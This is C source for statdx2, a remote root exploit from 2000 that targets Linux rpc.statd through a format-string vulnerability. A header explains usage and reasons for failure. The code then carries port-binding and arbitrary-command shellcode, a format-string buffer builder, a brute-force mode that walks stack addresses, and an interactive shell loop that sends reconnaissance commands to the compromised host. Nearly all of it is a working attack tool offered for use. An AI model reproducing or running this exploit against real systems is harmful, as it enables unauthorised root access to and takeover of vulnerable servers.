/**
*** statdx2 (the successor of statdx)
*** Linux rpc.statd remote root exploit
*** by ron1n <shellcode@hotmail.com>
*** October 10, 2000
***
*** $ ./statdx2 -h
***
*** This version supersedes my original release. The reason I chose to
*** resurrect this stale exploit is so the new incarnation would contain
*** many improvements over the first version.
***
*** There are major changes in the algorithm used in the exploit buffer
*** construction. The format string now uses "%hn" to eradicate several
*** rare but possible problems. I didn't know about the "$" trick when I
*** wrote statdx. Even though it seems to be the new trend, I decided to
*** ignore it for this particular exploit. An additional payload has been
*** added to allow remote execution of arbitrary commands. This should help
*** when the port-binding code can't be used.
***
*** There is now primitive brute forcing code which slightly increases
*** your chances of a successful exploitation against any vulnerable i386
*** distribution of Linux. In order to implement this, the attack strategy
*** had to be altered. A progressive brute force climb down the stack to
*** hit the correct address of the saved return address will cause problems
*** when the saved frame pointer is overwritten. Instead, an overwrite of
*** the saved frame pointer is used to cause redirection in the parent
*** epilog code (see phrack-55). This is much safer to use for brute
*** forcing and has the side benefit of being an alternative avenue of
*** attack when the usual target address contains a null byte. The null
*** byte truncation problem still exists when brute forcing though, so 
*** use common sense.
***
*** The information below is based on numerous questions I receive.
***
*** common reasons for failure
*** --------------------------
*** o   Confusing statd with rstatd.
*** o   Attacking an architecture that isn't i386.
*** o   Attacking an operating system that isn't Linux.
*** o   Attacking a different distribution of Linux with the
***     default Redhat exploitation variables.
*** o   Attacking a system whose statd has crashed because of
***     previous exploitation attempts, successful or not.
***     The portmapper will still advertise statd even though
***     it will remain dead until restarted.
*** o   Attacking a patched system or a system with stack
***     protection. Stack protection will defeat this exploit.
***     I have seen a way to deliver the shellcode elsewhere
***     using a different procedure call, but I am not going
***     to steal that idea.
***
*** important notes
*** ---------------
*** o   The attack may be logged in syslog target locations.
*** o   Statd is a standalone service; be careful. Brute
***     forcing can be fatal. In fact, it's highly probable
***     that it will be fatal. The brute force mode exists
***     only to introduce a behavior-based form of blind
***     debugging with crashes mapping stack frames. This is
***     very difficult to do and it requires patience, but
***     it can be done.
*** o   The nature of the vulnerability provides no means
***     to examine the stack remotely, afaik. If anyone
***     wants to drop me a free clue about this, email me.
***
*** dotslash examples
*** -----------------
*** # default Redhat attack
*** $./statdx2 -d0 target
*** # default Redhat attack; new payload
*** $./statdx2 -d0 -c "touch /blah" target
*** # saved ebp overwrite (used automatically when desirable)
*** $./statdx2 -a 0xbffff2fc -f target
*** # brute force mode -- 50 iterations (-f option implied)
*** $./statdx2 -a 0xbffff004 -n 50 -s 20 target
***
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SM_PROG 100024
#define SM_VERS 1
#define SM_STAT 1
#define SM_MAXSTRLEN 1024

#define PROCSTR 24
#define max(a,b) ((a)>(b)?(a):(b))

enum res { stat_succ, stat_fail };
struct sm_name { char *mon_name; };
struct sm_stat_res { enum res res_stat; int state; };

int usefp;              /* 0 = saved eip ; 1 = saved ebp */
char *command = NULL;   /* command to execute on target  */

char exec[] = /* any command */
"\xeb\x2d\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x89\x76\x0b\x89\x76"
"\x0f\x80\x46\x0f\x08\x89\x76\x13\x80\x46\x13\x1b\x89\x46\x17\x8d"
"\x56\x17\x8d\x4e\x0b\x89\xf3\xb0\x0b\xcd\x80\xb0\x01\xcd\x80\xe8"
"\xce\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x5f\x2d\x63\x5f\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";

char port[] = /* port 39168 */
"\x31\xc0\xeb\x7c\x59\x89\x41\x10\x89\x41\x08\xfe\xc0\x89\x41\x04"
"\x89\xc3\xfe\xc0\x89\x01\xb0\x66\xcd\x80\xb3\x02\x89\x59\x0c\xc6"
"\x41\x0e\x99\xc6\x41\x08\x10\x89\x49\x04\x80\x41\x04\x0c\x88\x01"
"\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\xb3\x05\x30\xc0\x88\x41"
"\x04\xb0\x66\xcd\x80\x89\xce\x88\xc3\x31\xc9\xb0\x3f\xcd\x80\xfe"
"\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xc7\x06\x2f\x62\x69"
"\x6e\xc7\x46\x04\x2f\x73\x68\x41\x30\xc0\x88\x46\x07\x89\x76\x0c"
"\x8d\x56\x10\x8d\x4e\x0c\x89\xf3\xb0\x0b\xcd\x80\xb0\x01\xcd\x80"
"\xe8\x7f\xff\xff\xff";

struct type
{
    int type;
    char *desc, *code;
    u_long bufpos;
    int buflen, offset, wipe;
};

struct type types[] =
{
    {0, "Redhat Linux 6.2/6.1/6.0", port, 0xbffff314, 1024, 600, 9},
    {0, NULL, NULL, 0, 0, 0, 0}
};

bool_t
xdr_sm_name(XDR *xdrs, struct sm_name *objp)
{
    if (!xdr_string(xdrs, &objp->mon_name, SM_MAXSTRLEN))
        return (FALSE);
    return (TRUE);
}

bool_t
xdr_res(XDR *xdrs, enum res *objp)
{
    if (!xdr_enum(xdrs, (enum_t *)objp))
        return (FALSE);
    return (TRUE);
}

bool_t
xdr_sm_stat_res(XDR *xdrs, struct sm_stat_res *objp)
{
    if (!xdr_res(xdrs, &objp->res_stat))
        return (FALSE);
    if (!xdr_int(xdrs, &objp->state))
        return (FALSE);
    return (TRUE);
}

void
usage(char *app)
{
    int i;

    fprintf(stderr, "statdx2 by ron1n <shellcode@hotmail.com>\n");
    fprintf(stderr, "Usage: %s [options] target\n", app);
    fprintf(stderr, "Available options:\n");
    fprintf(stderr, "->\t<argument required> [default behavior]\n");
    fprintf(stderr, "-t\tattack the server using tcp [udp]\n");
    fprintf(stderr, "-p\t<port statd listens on> [query]\n");
    fprintf(stderr, "-a\t<stack address of the buffer>\n");
    fprintf(stderr, "-l\t<length of the buffer> [1024]\n");
    fprintf(stderr, "-o\t<offset from buffer> [600]\n");
    fprintf(stderr, "-w\t<number of words to wipe> [9]\n");
    fprintf(stderr, "-s\t<timeout in seconds> [5]\n");
    fprintf(stderr, "-n\t<brute force mode count> [1]\n");
    fprintf(stderr, "-f\tattack saved ebp [saved eip]\n");
    fprintf(stderr, "-c\t<\"command to execute\"> [portbind]\n");
    fprintf(stderr, "-d\tuse a hardcoded <type>\n");
    fprintf(stderr, "Available types:\n");

    for(i = 0; types[i].desc; i++)
        fprintf(stderr, "%d\t%s\n", types[i].type, types[i].desc);

    exit(EXIT_FAILURE);
}

struct in_addr
getip(char *host)
{
    struct hostent *hs;

    if((hs = gethostbyname(host)) == NULL)
    {
        herror("gethostbyname()");
        exit(EXIT_FAILURE);
    }

    return *((struct in_addr *) hs->h_addr);
}

void
runshell(int sockd)
{
    char buff[1024];
    int fmax, ret;
    fd_set fds;

    fmax = max(fileno(stdin), sockd) + 1;
    send(sockd, "cd /;ls -alF;w;uname -a;id\n", 27, 0);

    for(;;)
    {
        FD_ZERO(&fds);
        FD_SET(fileno(stdin), &fds);
        FD_SET(sockd, &fds);

        if(select(fmax, &fds, NULL, NULL, NULL) < 0)
        {
            perror("select()");
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockd, &fds))
        {
            bzero(buff, sizeof buff);
            if((ret = recv(sockd, buff, sizeof buff, 0)) < 0)
            {
                perror("recv()");
                exit(EXIT_FAILURE);
            }
            if(!ret)
            {
                fprintf(stderr, "Connection closed\n");
                exit(EXIT_FAILURE);
            }
            write(fileno(stdout), buff, ret);
        }

        if(FD_ISSET(fileno(stdin), &fds))
        {
            bzero(buff, sizeof buff);
            ret = read(fileno(stdin), buff, sizeof buff);
            errno = 0;
            if(send(sockd, buff, ret, 0) != ret)
            {
                if(errno) perror("send()");
                else fprintf(stderr, "Transmission loss\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}

void
checkshell(struct sockaddr_in host)
{
    int sockd;

    host.sin_port = htons(39168);

    if((sockd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    if(!connect(sockd, (struct sockaddr *) &host, sizeof host))
    {
        printf("Owned?!\n");
        runshell(sockd);
    }

    close(sockd);
}

char *
buildex(char *sc, u_long bufpos, int buflen, int offset, int wipe)
{
    int i, j, elen;
    char *buff, *ptr;
    u_long retpos, dstpos, cnt, pad;

    retpos = bufpos + buflen + 4;
    dstpos = bufpos + offset;
    elen   = buflen - PROCSTR - 1;
    cnt    = PROCSTR;

    if(!(retpos & 0xff)) usefp = 1;
    if(usefp) retpos -= 4;

    if(!(ptr = buff = malloc(elen + 1)))
    {
        perror("malloc()");
        exit(EXIT_FAILURE);
    }

    for(i = 0; i < 4; i += 2)
    {
        for(j = 0; j < 4; j++)
            *ptr++ = retpos + i >> j * 8 & 0xff;
        memcpy(ptr, ptr - 4, 4);
        ptr += 4; cnt += 8;
    }

    for(i = 0; i < wipe; i++)
    {
        strncpy(ptr, "%8x", 3);
        ptr += 3; cnt += 8;
    }

    /* this should fix the sloppy bugs in statdx */
    pad = (dstpos & 0xffff) - cnt;
    ptr += sprintf(ptr, "%%%ldx%%hn", pad); 
    pad = (dstpos >> 16 & 0xffff) + 0x10000 - cnt - pad;
    ptr += sprintf(ptr, "%%%ldx%%hn", pad);

    memset(ptr, 0x90, elen - strlen(buff));
    buff[elen] = '\0';

    /* parent function epilog hijack */
    if(usefp)
    {
        ptr = buff + offset - PROCSTR + 4;
        for(j = 0; j < 4; j++)
            *ptr++ = dstpos + 8 >> j * 8 & 0xff;
    }

    if(command)
    {
        memcpy(buff + elen - strlen(sc) - strlen(command), sc, strlen(sc));
        memcpy(buff + elen - strlen(command), command, strlen(command));
    }
    else
        memcpy(buff + elen - strlen(sc), sc, strlen(sc));

    printf("wiping:  %d\n", wipe);
    printf("buffer:  %#lx/%d/%d\n", bufpos, buflen, strlen(buff));
    printf("target:  %#lx --> %#lx/buffer[%d]\n", retpos, dstpos, offset);
    printf("method:  %s\n", usefp ? "frame pointer" : "return address");
    printf("command: %s\n", command ? command : "<portbind>");
    printf("--\n");
    return buff;
}

int
main(int argc, char **argv)
{
    int ch;
    char *buff;

    CLIENT *clnt;
    enum clnt_stat res;
    struct timeval tv, tvr;
    struct sm_name smname;
    struct sm_stat_res smres;
    struct sockaddr_in addr;

    int type = -1;
    int usetcp = 0;
    int brutecnt = 1;
    int timeout = 5;
    int wipe = 9;
    int offset = 600;
    int buflen = 1024;
    char *target;
    char *sc = port;
    u_short port = 0;
    u_long bufpos = 0;

    int sockp = RPC_ANYSOCK;

    extern char *optarg;
    extern int optind;
    extern int opterr;
    opterr = 0;

    while((ch = getopt(argc, argv, "tp:a:l:o:w:s:n:fc:d:h")) != -1)
    {
        switch(ch)
        {
            case 't': usetcp = 1; break;
            case 'p': sscanf(optarg, "%hu", &port); break;
            case 'a': sscanf(optarg, "%lx", &bufpos); break;
            case 'l': buflen = atoi(optarg); break;
            case 'o': offset = atoi(optarg); break;
            case 'w': wipe = atoi(optarg); break;
            case 's': timeout = atoi(optarg); break;
            case 'n': brutecnt = atoi(optarg); /* FALL */
            case 'f': usefp = 1; break;
            case 'c': command = optarg; sc = exec; break;
            case 'd': type = atoi(optarg); break;
            case 'h':
            default : usage(argv[0]);
        }
    }

    if(!(target = argv[optind]))
    {
        fprintf(stderr, "No target host specified\n");
        exit(EXIT_FAILURE);
    }

    if(type >= 0)
    {
        if(type >= sizeof types / sizeof types[0] - 1)
        {
            fprintf(stderr, "Invalid type\n");
            exit(EXIT_FAILURE);
        }
        sc = types[type].code;
        bufpos = types[type].bufpos;
        buflen = types[type].buflen;
        offset = types[type].offset;
        wipe = types[type].wipe;
    }

    if(!bufpos)
    {
        fprintf(stderr, "No buffer address specified\n");
        exit(EXIT_FAILURE);
    }

    bzero(&addr, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr = getip(target);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;

    if(usetcp)
    {
        clnt = clnttcp_create(&addr, SM_PROG, SM_VERS, &sockp, 0, 0);
        if(clnt == NULL)
        {
            clnt_pcreateerror("clnttcp_create()");
            exit(EXIT_FAILURE);
        }
    }
    else
    {
        clnt = clntudp_create(&addr, SM_PROG, SM_VERS, tv, &sockp);
        if(clnt == NULL)
        {
            clnt_pcreateerror("clntudp_create()");
            exit(EXIT_FAILURE);
        }
        tvr.tv_sec = 2;
        tvr.tv_usec = 0;
        clnt_control(clnt, CLSET_RETRY_TIMEOUT, (char *) &tvr);
    }

    clnt->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);

    while(brutecnt--)
    {
        buff = buildex(sc, bufpos, buflen, offset, wipe);
        smname.mon_name = buff;
        res = clnt_call(clnt, SM_STAT, (xdrproc_t) xdr_sm_name,
                (caddr_t) &smname, (xdrproc_t) xdr_sm_stat_res,
                (caddr_t) &smres, tv);

        if(res != RPC_SUCCESS)
        {
            clnt_perror(clnt, "clnt_call()");
            if(res == RPC_TIMEDOUT)
            {
                printf("A timeout was expected. Exploitation succeeded?\n");
                if(!command) { checkshell(addr); printf("Nope, sorry\n"); }
            }
            break;
        }
        else
        {
            printf("Failed - statd returned res_stat: (%s) state: %d\n",
                    smres.res_stat ? "failure" : "success", smres.state);
        }

        free(buff);
        bufpos += 4;
    }

    clnt_destroy(clnt);
    exit(EXIT_SUCCESS);
}

